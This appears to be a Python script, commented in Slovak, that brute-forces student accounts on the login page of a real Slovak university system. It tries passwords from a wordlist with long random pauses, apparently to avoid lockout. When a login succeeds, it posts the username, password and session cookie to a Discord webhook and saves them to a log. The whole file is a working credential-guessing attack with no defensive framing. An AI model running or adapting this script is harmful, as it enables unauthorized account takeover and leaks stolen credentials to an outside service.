#!/usr/bin/env python3

import requests
import sys
import time
import random

username = input("[*] Zadaj username: ")

url = "https://ais2.ukf.sk/ais/login.do"
discord_webhook = ""                 
wordlist = "modules/passwords.txt"   

try:
    with open(wordlist, "r", encoding="utf-8") as f:
        # odstrani prazdne riadky a medzery
        payloads = [line.strip() for line in f if line.strip()]
except FileNotFoundError:
    print(f"[-] Error: wordlist nebol najdeny: {wordlist!r}", file=sys.stderr)
    sys.exit(1)

cookies = {"JSESSIONID": "5C25016E0DD41702D6DDCF66E7D1EC8C.server13"}

def notify_discord(message):
    try:
        requests.post(discord_webhook, json={"content": message})
    except Exception as e:
        print(f"Chyba pri odosielani na Discord: {e}")

def try_login(user, password):
    data = {
        "login": user,
        "password": password
    }
    headers = {
        "User-Agent": "Mozilla/5.0",
        "Content-Type": "application/x-www-form-urlencoded",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Origin": "https://ais2.ukf.sk",
        "Referer": "https://ais2.ukf.sk/ais/start.do"
    }
    resp = requests.post(url, data=data, headers=headers, cookies=cookies, allow_redirects=False, timeout=10)
    return resp

for pw in payloads:
    resp = try_login(username, pw)

    sess_cookie = resp.cookies.get("JSESSIONID")
    location = resp.headers.get("Location", "")

    # Uspech: redirect do /local/apps/sk, ked davam namiesto and location.startswith and sess_cookie, ako to je vo webmail, nastava problem, takto si teda lepsie overim ci preslo k presmerovaniu
    if resp.status_code == 302 and location.startswith("/ais/apps/student/sk"):
        msg = f"[FOUND] Username: {username} | Password: {pw} | JSESSIONID: {sess_cookie}"
        print(msg)
        notify_discord(msg)
        with open("modules/logs/log_found_ais.txt", "a", encoding="utf-8") as logfile:
            logfile.write(msg + "\n")
        break
    else:
        print(f"[FAIL] {pw} | status: {resp.status_code}")
        
    time.sleep(random.uniform(300, 350))  # Pauza medzi 300 - 350 sekundami
#else: 
#    print(f"[NOT FOUND] Password for {username} not found")


